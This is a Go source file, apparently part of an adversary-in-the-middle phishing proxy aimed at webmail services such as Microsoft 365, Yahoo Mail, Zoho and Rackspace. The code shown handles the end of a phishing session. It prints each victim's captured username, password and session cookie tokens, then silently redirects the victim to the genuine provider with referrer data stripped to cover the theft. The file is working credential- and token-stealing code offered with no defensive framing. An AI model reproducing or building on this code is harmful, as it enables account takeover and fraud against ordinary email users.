package main

import (
	"fmt"
	"net/http"
	"strings"
)

// ══════════════════════════════════════════════════════════
//  TERMINATION REDIRECT
// ══════════════════════════════════════════════════════════

var terminationURLs = map[string]string{
	"Microsoft 365":        "https://www.office.com",
	"Turbify (Yahoo Mail)": "https://mail.turbify.com",
	"Microsoft (Personal)": "https://outlook.live.com",
	"Yahoo Mail":           "https://mail.yahoo.com", // ← add
	"Rackspace Webmail":    "https://apps.rackspace.com/",
	"Zoho Mail":            "https://mail.zoho.com/",
}

const defaultTerminateURL = "https://www.office.com"

func shouldTerminate(s *Session, r *http.Request) bool {
	if s == nil || !s.IsDone {
		return false
	}
	if r.Method != "GET" {
		return false
	}
	if r.Header.Get("X-Requested-With") == "XMLHttpRequest" {
		return false
	}
	if r.Header.Get("Sec-Fetch-Mode") == "cors" {
		return false
	}
	if r.Header.Get("Sec-Fetch-Dest") == "empty" {
		return false
	}

	fetchDest := r.Header.Get("Sec-Fetch-Dest")
	fetchMode := r.Header.Get("Sec-Fetch-Mode")
	accept := r.Header.Get("Accept")

	isPageNavigation := fetchDest == "document" ||
		fetchMode == "navigate" ||
		strings.Contains(accept, "text/html")
	if !isPageNavigation {
		return false
	}
	if isAssetPath(r.URL.Path) {
		return false
	}
	if strings.HasPrefix(r.URL.Path, "/_next/") {
		return false
	}
	return true
}

func doTerminate(w http.ResponseWriter, s *Session, r *http.Request) {
	targetURL := defaultTerminateURL
	if url, ok := terminationURLs[s.TargetName]; ok {
		targetURL = url
	}

	fmt.Printf("\n[✓] [%d] [%s] SESSION COMPLETE — redirecting victim to %s\n",
		s.Index, s.TargetName, targetURL)
	fmt.Printf("[✓] Username: %s\n", s.Username)
	fmt.Printf("[✓] Password: %s\n", s.Password)
	fmt.Printf("[✓] Tokens:   %d captured\n", len(s.CookieTokens))
	for name, val := range s.CookieTokens {
		fmt.Printf("[✓]   %s = %s\n", name, truncate(val, 50))
	}
	fmt.Println()

	html := fmt.Sprintf(
		`<html><head>`+
			`<meta name="referrer" content="no-referrer">`+
			`<meta http-equiv="refresh" content="0;url=%s">`+
			`<script>top.location.replace('%s');</script>`+
			`</head><body></body></html>`,
		targetURL, targetURL,
	)

	w.Header().Set("Content-Type", "text/html")
	w.Header().Set("Cache-Control", "no-cache, no-store")
	w.Header().Set("Referrer-Policy", "no-referrer")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(html))
}

func isAssetPath(path string) bool {
	assetExts := []string{
		".js", ".css", ".png", ".jpg", ".jpeg", ".gif",
		".svg", ".ico", ".woff", ".woff2", ".ttf", ".eot",
		".map", ".webp", ".avif",
	}
	lower := strings.ToLower(path)
	for _, ext := range assetExts {
		if strings.HasSuffix(lower, ext) {
			return true
		}
	}
	return false
}
